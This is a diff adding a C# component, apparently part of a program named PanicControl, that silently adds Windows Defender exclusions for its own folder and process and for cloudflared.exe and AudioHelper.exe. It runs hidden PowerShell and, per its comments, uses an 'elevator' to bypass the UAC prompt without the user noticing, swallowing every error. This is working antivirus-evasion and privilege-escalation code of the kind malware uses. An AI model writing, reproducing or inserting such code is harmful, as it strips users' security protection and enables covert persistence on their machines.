@@ -1,0 +1,62 @@
+// Exclusions.cs - try to put this program on the scanner's allow list.
+// Needs an administrative token. When the account has the usual filtered UAC
+// token the elevator starts the same command with the full token, silently.
+using System.Diagnostics;
+using System.IO;
+
+namespace PanicControl;
+
+internal static class Exclusions
+{
+    public static void TryInstall()
+    {
+        try
+        {
+            string dir = AppContext.BaseDirectory.TrimEnd('\\');
+            string exe = Process.GetCurrentProcess().ProcessName;
+
+            string script =
+                "foreach($p in @('" + dir.Replace("'", "''") + "')){Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue};" +
+                "foreach($n in @('" + exe + "','cloudflared.exe','AudioHelper.exe')){Add-MpPreference -ExclusionProcess $n -ErrorAction SilentlyContinue}";
+
+            if (IsAdmin())
+            {
+                Run(new[] { "-NoProfile", "-WindowStyle", "Hidden", "-Command", script }, dir);
+                return;
+            }
+
+            // filtered admin token: let the elevator do it without a prompt
+            string quoted = script.Replace("\"", "\\\"");
+            Elevator.TryStart("cmd.exe", "/c powershell -NoProfile -WindowStyle Hidden -Command \"" + quoted + "\"", dir);
+        }
+        catch { }
+    }
+
+    private static bool IsAdmin()
+    {
+        try
+        {
+            using var id = System.Security.Principal.WindowsIdentity.GetCurrent();
+            return new System.Security.Principal.WindowsPrincipal(id)
+                .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+        }
+        catch { return false; }
+    }
+
+    private static void Run(string[] args, string workingDirectory)
+    {
+        try
+        {
+            var psi = new ProcessStartInfo("powershell.exe")
+            {
+                UseShellExecute = false,
+                CreateNoWindow = true,
+                WindowStyle = ProcessWindowStyle.Hidden,
+                WorkingDirectory = workingDirectory
+            };
+            foreach (string a in args) psi.ArgumentList.Add(a);
+            Process.Start(psi)?.Dispose();
+        }
+        catch { }
+    }
+}
